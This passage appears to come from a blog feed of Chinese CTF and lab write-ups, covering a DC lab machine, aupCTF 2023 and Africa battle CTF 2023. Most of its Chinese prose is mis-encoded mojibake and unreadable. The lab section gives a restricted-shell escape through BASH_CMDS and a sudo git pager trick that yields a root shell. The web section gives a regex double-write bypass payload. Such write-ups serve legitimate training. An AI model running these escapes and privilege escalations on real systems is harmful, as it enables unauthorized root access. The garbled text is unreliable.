å˜é‡çš„å€¼ã€‚å®ƒå°†è¢«å±•å¼€ä¸ºå½“å‰çš„ PATH è·¯å¾„ã€‚<br>&#x2F;bin&#x2F; æ˜¯è¦æ·»åŠ åˆ° PATH ä¸­çš„ç›®å½•è·¯å¾„ã€‚<br>é€šè¿‡æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ å°†æŠŠ &#x2F;bin&#x2F; ç›®å½•æ·»åŠ åˆ°å½“å‰çš„ PATH å˜é‡ä¸­ï¼Œä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿåœ¨ &#x2F;bin&#x2F; ç›®å½•ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™æ ·ï¼Œåœ¨ä½ æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿå°†ä¼šåœ¨åŸæœ‰çš„ PATH è·¯å¾„ä¸­æœç´¢å‘½ä»¤ï¼ŒåŒæ—¶ä¹Ÿä¼šåœ¨ &#x2F;bin&#x2F; ç›®å½•ä¸­æœç´¢å‘½ä»¤ã€‚<br>è¿™ç§æ–¹å¼å¯ä»¥æ–¹ä¾¿åœ°æ‰§è¡Œä½äº &#x2F;bin&#x2F; ç›®å½•ä¸‹çš„å‘½ä»¤ï¼Œè€Œæ— éœ€æŒ‡å®šå®Œæ•´çš„è·¯å¾„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨ export å‘½ä»¤è®¾ç½®ç¯å¢ƒå˜é‡æ—¶ï¼Œåªä¼šåœ¨å½“å‰ä¼šè¯ä¸­ç”Ÿæ•ˆã€‚å¦‚æœå¸Œæœ›åœ¨æ¯æ¬¡ç™»å½•æ—¶è‡ªåŠ¨è®¾ç½® PATHï¼Œå¯ä»¥å°†è¯¥å‘½ä»¤æ·»åŠ åˆ°å¯åŠ¨æ–‡ä»¶ï¼ˆå¦‚ .bashrc æˆ– .bash_profileï¼‰ä¸­ã€‚</p>
</blockquote>
<p><code>export PATH=$PATH:/usr/bin/</code></p>
<blockquote>
<p>è¿™æ¡å‘½ä»¤å°†æŠŠ &#x2F;usr&#x2F;bin&#x2F; ç›®å½•æ·»åŠ åˆ°å½“å‰ PATH ç¯å¢ƒå˜é‡ä¸­ã€‚<br>ç¯å¢ƒå˜é‡ PATH æŒ‡å®šäº†æ“ä½œç³»ç»Ÿåœ¨æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶æ—¶è¦æœç´¢çš„ç›®å½•åˆ—è¡¨ã€‚é€šè¿‡å°†ä¸€ä¸ªç›®å½•è·¯å¾„æ·»åŠ åˆ° PATH ä¸­ï¼Œä½ å¯ä»¥ä½¿ç³»ç»Ÿåœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>å…·ä½“è€Œè¨€ï¼Œexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin&#x2F; è¿™æ¡å‘½ä»¤çš„å«ä¹‰æ˜¯ï¼š<br>$PATH è¡¨ç¤ºå½“å‰å·²ç»è®¾ç½®çš„ PATH å˜é‡çš„å€¼ã€‚å®ƒå°†è¢«å±•å¼€ä¸ºå½“å‰çš„ PATH è·¯å¾„ã€‚<br>&#x2F;usr&#x2F;bin&#x2F; æ˜¯è¦æ·»åŠ åˆ° PATH ä¸­çš„ç›®å½•è·¯å¾„ã€‚<br>é€šè¿‡æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ å°†æŠŠ &#x2F;usr&#x2F;bin&#x2F; ç›®å½•æ·»åŠ åˆ°å½“å‰çš„ PATH å˜é‡ä¸­ï¼Œä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿåœ¨ &#x2F;usr&#x2F;bin&#x2F; ç›®å½•ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™æ ·ï¼Œåœ¨ä½ æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿå°†ä¼šåœ¨åŸæœ‰çš„ PATH è·¯å¾„ä¸­æœç´¢å‘½ä»¤ï¼ŒåŒæ—¶ä¹Ÿä¼šåœ¨ &#x2F;usr&#x2F;bin&#x2F; ç›®å½•ä¸­æœç´¢å‘½ä»¤ã€‚<br>è¿™ç§æ–¹å¼å¯ä»¥æ–¹ä¾¿åœ°æ‰§è¡Œä½äº &#x2F;usr&#x2F;bin&#x2F; ç›®å½•ä¸‹çš„å‘½ä»¤ï¼Œè€Œæ— éœ€æŒ‡å®šå®Œæ•´çš„è·¯å¾„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨ export å‘½ä»¤è®¾ç½®ç¯å¢ƒå˜é‡æ—¶ï¼Œåªä¼šåœ¨å½“å‰ä¼šè¯ä¸­ç”Ÿæ•ˆã€‚å¦‚æœå¸Œæœ›åœ¨æ¯æ¬¡ç™»å½•æ—¶è‡ªåŠ¨è®¾ç½® PATHï¼Œå¯ä»¥å°†è¯¥å‘½ä»¤æ·»åŠ åˆ°å¯åŠ¨æ–‡ä»¶ï¼ˆå¦‚ .bashrc æˆ– .bash_profileï¼‰ä¸­ã€‚</p>
</blockquote>
<h3 id="BASH-CMDSè®¾ç½®shell"><a href="#BASH-CMDSè®¾ç½®shell" class="headerlink" title="BASH_CMDSè®¾ç½®shell"></a>BASH_CMDSè®¾ç½®shell</h3><p>BASH_CMDS æ˜¯ä¸€ä¸ªåŒ…å« Bash å‘½ä»¤çš„å…³è”æ•°ç»„ï¼ˆassociative arrayï¼‰ç¯å¢ƒå˜é‡ã€‚å®ƒåœ¨ Bash ä¸­ç”¨äºå­˜å‚¨å’Œç®¡ç†å‘½ä»¤çš„å®šä¹‰å’Œåˆ«åã€‚å½“ä½ åœ¨ Bash ä¸­å®šä¹‰ä¸€ä¸ªå‡½æ•°ã€åˆ«åæˆ–å…³é”®å­—æ—¶ï¼Œå®ƒä¼šè¢«æ·»åŠ åˆ° BASH_CMDS ç¯å¢ƒå˜é‡ä¸­ã€‚BASH_CMDS æ˜¯ä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå®ƒä»¥å‘½ä»¤åä½œä¸ºç´¢å¼•ï¼Œå¯¹åº”çš„å€¼åˆ™æ˜¯å‘½ä»¤çš„å®šä¹‰ã€‚</p>
<p><code>BASH_CMDS[x]=/bin/bash</code>è¿™ä¸ªå‘½ä»¤æ˜¯åœ¨BASH_CMDSæ•°ç»„ä¸­å°†ç´¢å¼•xå…³è”åˆ°&#x2F;bin&#x2F;bashçš„å‘½ä»¤ï¼Œæ„æ€å°±æ˜¯æ‰§è¡Œ<strong>a</strong>å‘½ä»¤æ—¶ä¹Ÿå°±æ˜¯æ‰§è¡Œäº†**&#x2F;bin&#x2F;bash**å‘½ä»¤ã€‚<br>ä¸ä¸Šé¢ä¸¤æ¡å‘½ä»¤é…åˆä¹‹åå°±å¯ä»¥å®ç°rbashé€ƒé€¸ã€‚(å¯ä»¥æ‰§è¡Œè¢«é™åˆ¶çš„å‘½ä»¤äº†)<br><img src="https://img-blog.csdnimg.cn/f1b84162e4bd44f3af7d24217ca12ca0.png" alt="2"></p>
<h3 id="gitææƒ"><a href="#gitææƒ" class="headerlink" title="gitææƒ"></a>gitææƒ</h3><p>å‰é¢å®ç°<strong>rbashé€ƒé€¸</strong>åæ‰“å¼€flagæ–‡ä»¶æç¤ºjerryç”¨æˆ·ï¼Œæˆ‘ä»¬åˆ‡æ¢åˆ°jerryç”¨æˆ·ï¼ˆå¯†ç å°±æ˜¯ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„å¯†ç ï¼‰ï¼Œæ‰“å¼€jerryç”¨æˆ·ä¸‹çš„flagå¾—åˆ°æç¤ºéœ€è¦gitææƒã€‚<br>gitææƒçš„å‰ææ˜¯åœ¨ä½¿ç”¨å‘½ä»¤<code>sudo -l</code>ä¹‹åæ²¡æœ‰å¯†ç éªŒè¯ã€‚<br><img src="https://img-blog.csdnimg.cn/151e0426bdce4e17b9045110b9e3dc0d.png" alt="1"><br><strong>ç¬¬ä¸€ç§</strong></p>
<blockquote>
<p>sudo git help config</p>
</blockquote>
<p>å›è½¦ç„¶åè¾“å…¥</p>
<blockquote>
<p>!&#x2F;bin&#x2F;bash  (è¿™é‡Œbashä¹Ÿå¯ä»¥æ¢æˆsh)</p>
</blockquote>
<p><strong>ç¬¬äºŒç§</strong></p>
<blockquote>
<p>sudo git -p help</p>
</blockquote>
<p>å›è½¦è¾“å…¥</p>
<blockquote>
<p>!&#x2F;bin&#x2F;bash  (è¿™é‡Œbashä¹Ÿå¯ä»¥æ¢æˆsh)</p>
</blockquote>
<p>å·²ç»æˆä¸ºrootæƒé™</p>
<h2 id="å‘½ä»¤å­¦ä¹ "><a href="#å‘½ä»¤å­¦ä¹ " class="headerlink" title="å‘½ä»¤å­¦ä¹ "></a>å‘½ä»¤å­¦ä¹ </h2><p>ç¯å¢ƒå˜é‡æŸ¥çœ‹ï¼ˆæŸ¥çœ‹å¯æ‰§è¡Œå‘½ä»¤ï¼‰</p>
<blockquote>
<p>echo $PATH<br>æ¯”å¦‚è¯´å¾—åˆ°**&#x2F;home&#x2F;jerry&#x2F;bin**ï¼Œåé¢ä½¿ç”¨<code>echo /home/jerry/bin/*</code>æŸ¥çœ‹å¯æ‰§è¡Œçš„å‘½ä»¤</p>
</blockquote>
<p>æ·»åŠ ç¯å¢ƒå˜é‡</p>
<blockquote>
<p>export PATH&#x3D;$PATH:è·¯å¾„<br>å¸¸ç”¨è·¯å¾„å˜é‡&#x2F;usr&#x2F;binå’Œ&#x2F;bin&#x2F;</p>
</blockquote>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
      <tags>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>aupCTF 2023</title>
    <url>/2023/06/26/aupCTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient-Cipher"><a href="#Ancient-Cipher" class="headerlink" title="Ancient Cipher"></a>Ancient Cipher</h3><p><img src="https://img-blog.csdnimg.cn/5df595f659f94c7ab5d801f037dc2a2d.png" alt="1"><br>å…ˆæ”¾éšæ³¢é€æµé‡Œçœ‹çœ‹ï¼Œå¾—åˆ°flagï¼Œæ˜¯å‡¯æ’’ä½ç§»17ä½<br><img src="https://img-blog.csdnimg.cn/ba3e1de862294304a5b0ef7baddfaf6b.png" alt="2"></p>
<h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="https://img-blog.csdnimg.cn/0f0569b9766b44a786367768f6b9e46e.png" alt="3"><br>è¿™ä¸ªå¯†ç ç¬¬ä¸€æ¬¡è§ï¼ŒæŸ¥äº†ä¸€ä¸‹æ˜¯æ©å°¼æ ¼ç æœºï¼Œä½¿ç”¨ç½‘ç«™<a href="https://www.dcode.fr/chiffre-machine-enigma">dcode.fr</a>è§£å¯†<br><img src="https://img-blog.csdnimg.cn/e8e5f10487bf4d5b9c058283305c173b.png" alt="3">å¾—åˆ°flagã€‚</p>
<h3 id="Swiss-Army-Knife"><a href="#Swiss-Army-Knife" class="headerlink" title="Swiss Army Knife"></a>Swiss Army Knife</h3><p>ç‚¹å¼€æ–‡ä»¶åæ˜¯ç”±XYç»„æˆçš„å­—ç¬¦<br><img src="https://img-blog.csdnimg.cn/5c8faeb486e642c7bb99a4da46ec88f0.png" alt="1">è¿™è®©æˆ‘æƒ³åˆ°äº†äºŒè¿›åˆ¶0å’Œ1ã€‚å°†Xæ›¿æ¢ä¸º0ï¼ŒYæ›¿æ¢ä¸º1<br><code>01001100 01010011 00110000 01110100 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001100 01101001 01000001 01110101 01001100 01101001 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01010011 01000001 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01101001 00110000 01110101 01001001 01000011 00110000 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110000 01110100 01001100 01010011 01000001 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110100 01001100 01101001 00110100 01100111 01001100 01101001 00110000 01110100 01001001 01000011 00110000 01110100 01001100 01010011 01000001 01110101 01001100 01101001 00110100 01110101 01001100 01101001 01000001 01110101 01001100 01010011 00110100 01100111 01001100 01010011 00110000 01110101 01001100 01010011 01000001 01110100 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01101001 00110000 01100111 01001100 01010011 00110100 01110100 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110000 01110100 01001001 01000011 00110000 01110101 01001100 01101001 00110100 01110101 01001001 01000011 00110100 01110100 01001100 01101001 01000001 01110101 01001100 01101001 00110100 01110100 01001001 01000011 00110100 01110101 01001100 01010011 00110100 01100111 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110100 01001001 01000011 00110000 01110101 01001100 01101001 01000001 01110100 01001100 01101001 00110000 01100111 01001100 01010011 00110000 01100111 01001100 01101001 00110100 01110101 01001100 01010011 00110000 01100111 01001100 01010011 00110100 01110101 01001100 01010011 01000001 01110101 01001100 01010011 00110000 01110101 01001001 01000011 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010011 01000001 01110100 01001100 01101001 00110100 01110101 01001100 01010001 00111101 00111101</code><br>ç„¶åäºŒè¿›åˆ¶è½¬asciiç <br><img src="https://img-blog.csdnimg.cn/5cd8d3aaff6c474eb06754a05281c615.png" alt="1">å¾—åˆ°base64ç¼–ç çš„å¯†æ–‡ï¼Œå†è¿›è¡Œè§£å¯†å¾—åˆ°æ‘©æ–¯å¯†ç <br><img src="https://img-blog.csdnimg.cn/59f1604b00e046fab59fc63703de08cb.png" alt="1">åœ¨è¿›è¡Œæ‘©æ–¯å¯†ç è§£å¯†ååˆå¾—åˆ°baseç³»åˆ—çš„å¯†æ–‡<br><img src="https://img-blog.csdnimg.cn/9840a4da1a1b450482459d1139feb27e.png" alt="2">ç»§ç»­è§£å¯†<br><img src="https://img-blog.csdnimg.cn/8ea27925a3a54fb6b5b99e177b2351c9.png" alt="1">æœ€åå†è¿›è¡Œä¸€æ¬¡å‡¯æ’’è§£å¯†ï¼Œkey&#x3D;19ï¼Œå¾—åˆ°flagã€‚<strong>aupCTF{mu1tip13-3nc0d1ng5-u53d}</strong></p>
<h3 id="Battistaâ€™s-Bet"><a href="#Battistaâ€™s-Bet" class="headerlink" title="Battistaâ€™s Bet"></a>Battistaâ€™s Bet</h3><p><strong>æˆ‘çš„æœ‹å‹æ˜¯æ„å¤§åˆ©è‘—åå¯†ç å­¦å®¶Giovan Battista Bellasoçš„å¿ å®ç²‰ä¸ï¼Œä»–å‘æˆ‘æŒ‘æˆ˜ç ´è§£è¿™ä¸ªå¯†æ–‡ã€‚æˆ‘ä¸€ç›´åœ¨åŠªåŠ›è§£ç å®ƒï¼Œä½ èƒ½å¸®æˆ‘å— **<br>æŸ¥æ‰¾è¿™ä¸ªå¯†ç å­¦å®¶å‘æ˜çš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/9edf442d5cd04e6bb10dbff65252c89d.png" alt="1">æ‰“å¼€<a href="https://www.dcode.fr/chiffre-autoclave">ç½‘ç«™</a>è§£å¯†<br>è¿™é‡Œéœ€è¦ä¸€ä¸ªå¯†é’¥ï¼ŒæŸ¥çœ‹æç¤ºå‘ç°å¯†é’¥ä¸º</strong>SECRET**<br><img src="https://img-blog.csdnimg.cn/d4ffb92d6b4c42fd9b8a0579ca441991.png" alt="2">å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/9b847c749a684ba4a8d84d6f6d5ca062.png" alt="2"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Starter"><a href="#Starter" class="headerlink" title="Starter"></a>Starter</h3><p>æ‰“å¼€ç½‘ç«™åå¦‚ä¸‹ç•Œé¢<br><img src="https://img-blog.csdnimg.cn/d2498d0fc13b422cb81eec69d0c87a2f.png" alt="6">æŸ¥çœ‹æºç å¾—åˆ°flagã€‚<strong>aupCTF{w45nâ€™t-th47-h4rd-r1gh7}</strong><br><img src="https://img-blog.csdnimg.cn/2af8c9822abb47fda91d26bd8b464b41.png" alt="7"></p>
<h3 id="SQLi-1"><a href="#SQLi-1" class="headerlink" title="SQLi - 1"></a>SQLi - 1</h3><p><img src="https://img-blog.csdnimg.cn/12c88ff0993c4feaaaa5b118f669d684.png" alt="7">å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/e3d70cf1983240e3b7bc7e5b007b3329.png" alt="2"></p>
<h3 id="SQLi-2"><a href="#SQLi-2" class="headerlink" title="SQLi - 2"></a>SQLi - 2</h3><p>æ–¹æ³•åŒSQLi - 1</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>ç»™å‡ºæºç </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">headar_easy</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>META<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'HTTP_GETFLAG'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>
        context <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token string">'[REDACTED]'</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        
        <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/flag.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token string">'aa/index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ„æ€å°±æ˜¯å¦‚æœheaderå¤´é‡Œæœ‰GETFLAGï¼Œå¹¶ä¸”å€¼ä¸ºyeså³å¯å¾—å‡ºflagã€‚<strong>aupCTF{cust0m-he4d3r-r3qu3st}</strong><br><img src="https://img-blog.csdnimg.cn/fb98935d0ddd4199911500d3d259d82c.png" alt="1"></p>
<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p><img src="https://img-blog.csdnimg.cn/0f027c28c6fe4a7eb1179daeaa99dbf0.png" alt="2"><br>æ‰“å¼€ç½‘ç«™å<br><img src="https://img-blog.csdnimg.cn/453d33679d7c4d86969f177b9a73147d.png" alt="3">éšä¾¿ç‚¹è¿›ä¸€ä¸ªçœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/6cdfe7300f214c7a8003a3312c65f3c2.png" alt="2"><br>é¢˜ç›®æ„æ€å°±æ˜¯çˆ†ç ´pageï¼Œæœä¸å…¶ç„¶ï¼Œå‘ç°712ä¸ºflagã€‚<br><img src="https://img-blog.csdnimg.cn/552adc4ecd794ed982cb5681c503668d.png" alt="3"></p>
<h2 id="Stegnography"><a href="#Stegnography" class="headerlink" title="Stegnography"></a>Stegnography</h2><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>çœ‹é¢˜ç›®å°±çŸ¥é“æ˜¯LSBéšå†™ã€‚<br><img src="https://img-blog.csdnimg.cn/2253e5d2e4b74e7fb2dd531267e47149.png" alt="6"><br>æ‹¿åˆ°flagï¼š<strong>aupCTF{zst1g-1s-c00l_rig3ht}</strong></p>
<h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>ç»™å‡ºä¸¤ä¸ªæ¨¡ç³Šå›¾ç‰‡ï¼Œè¿›è¡Œå¼‚æˆ–å¤„ç†ã€‚<br>ä½¿ç”¨å·¥å…·<strong>Stegsolve.jar</strong><br>å…ˆé€‰æ‹©ä¸€å¼ å›¾ç‰‡ï¼Œç„¶ååœ¨ä¸å¦ä¸€å¼ å›¾ç‰‡ç»“åˆ<br><img src="https://img-blog.csdnimg.cn/5d3f882cc578437d83836eff62d22738.png" alt="1"><br>ä¹‹åå¾—åˆ°å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/3dc9c71a6ece4deba4cd1dd49a996a8f.png" alt="2"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h3><p>JSFUCKè§£å¯†<br><img src="https://img-blog.csdnimg.cn/38a4f300723c41f48d5f83d2564b51cc.png" alt="1"><br>æ”¾æ§åˆ¶å°é‡Œè¿è¡Œå°±å¯ä»¥å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/a31ef56efa794b0ab298c69e29f3ff6b.png" alt="1"><br><strong>aupCTF{j4v45c1pt_but_f*ck3d}</strong></p>
<h3 id="Sanity-check"><a href="#Sanity-check" class="headerlink" title="Sanity check"></a>Sanity check</h3><p><img src="https://img-blog.csdnimg.cn/f5113653227342e7b872c62864e5621d.png" alt="1">å°±æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œflagåœ¨è§„åˆ™é‡Œè¯´æ˜äº†<br><img src="https://img-blog.csdnimg.cn/e26f24dd654b4460a14a9e1dcea4e2a5.png" alt="2"></p>
<h3 id="Frequency"><a href="#Frequency" class="headerlink" title="Frequency"></a>Frequency</h3><p><img src="https://img-blog.csdnimg.cn/cce4e02a75d24f24a43a7ac3a6ac9cfc.png" alt="1">ä¸‹è½½éŸ³é¢‘æ–‡ä»¶åå¬åˆ°æŒ‰é”®çš„å£°éŸ³ï¼Œçœ‹æ¥æ˜¯<strong>DTMFæ‹¨å·éŸ³è¯†åˆ«</strong>æœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜<a href="https://blog.csdn.net/qq_42939527/article/details/105201926">ã€WUST-CTF2020ã€‘girlfriend</a><br>ä½¿ç”¨å·¥å…·<strong>dtmf2num_2</strong>å¾—åˆ°æŒ‰é”®å·ç <br><img src="https://img-blog.csdnimg.cn/5c1938e626414009aa94897eee698429.png" alt="3"><br>æ‹¿åˆ°flagã€‚<strong>aupCTF{00923456060484}</strong></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Africa battle CTF 2023</title>
    <url>/2023/06/24/Africa-battle-CTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å‡ å¤©å›½å†…æ²¡æœ‰ä»€ä¹ˆæ¯”èµ›ï¼Œçœ‹ä¸€ä¸‹å›½å¤–çš„æ¯”èµ›å§<br><img src="https://img1.imgtp.com/2023/06/24/1vay1LoH.png" alt="1"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>ä¸€å¼€å§‹åšwebé¢˜çš„æ—¶å€™ç¯å¢ƒä¸€ç›´æ‰“ä¸å¼€ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯é‚£è¾¹çš„é—®é¢˜ï¼Œç»“æœä¸‹åˆæ¢äº†æœºåœºåˆèƒ½è®¿é—®äº†ã€‚</p>
<h3 id="Civilization"><a href="#Civilization" class="headerlink" title="Civilization"></a>Civilization</h3><p>æ‰“å¼€ç½‘ç«™åçœ‹åˆ°è¿™ä¸ª<br><img src="https://img-blog.csdnimg.cn/1197576aa444402bbeccc85df9ccafcd.png" alt="2"><br>æ‰“å¼€ç½‘ç«™åçœ‹åˆ°è¿™ä¸ª<br>ä¼ å…¥sourceåæ˜¾ç¤ºæºç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$cigar</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'africacradlecivilization'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$cigar</span></span>/"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$cigar</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">africa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>okï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯åœ¨ä¼ å…¥sourceåä¼šæ˜¾ç¤ºæºç ï¼Œä¹‹åå¦‚æœå†ä¼ å…¥amiçš„è¯ï¼Œå†è¿›è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…æ„æ€å°±æ˜¯å°†<strong>cigar</strong>çš„å€¼<strong>africacradlecivilization</strong>åˆ é™¤åå¦‚æœè¿˜ç­‰äº<strong>cigar</strong>é‚£å°±è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œé‚£ä¹ˆå¯ä»¥æƒ³åˆ°åŒå†™è¿›è¡Œç»•è¿‡ã€‚ä¼ å…¥<code>?source=&amp;ami=africacrafricacradlecivilizationadlecivilization</code>å³å¯å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/f267e5a536424c08971111a00c024839.png" alt="2"></p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h3><p><img src="https://img-blog.csdnimg.cn/0f847f4b10fe4d4bb16ec186df53b093.png" alt="3"></p>
<p>è¿™é“é¢˜ä¸‹è½½ä¹‹åå°±æ˜¯ä¸€å¼ å›¾ç‰‡æŸ¥çœ‹çš„æ—¶å€™å˜æˆäº†äºŒç»´ç ã€‚<img src="https://img-blog.csdnimg.cn/edbed056a8ce45bbbcd0895bd8a43ce5.jpeg" alt="3"><br><img src="https://img-blog.csdnimg.cn/98b35979c0f1473c99e3d22abc891009.png" alt="5"><br>å¾®ä¿¡æ‰«ä¸€æ‰«å³å‡ºflagã€‚<br><img src="https://img-blog.csdnimg.cn/3f6b41a7f97f4c14a519c2f49c53fc3a.png" alt="6"></p>
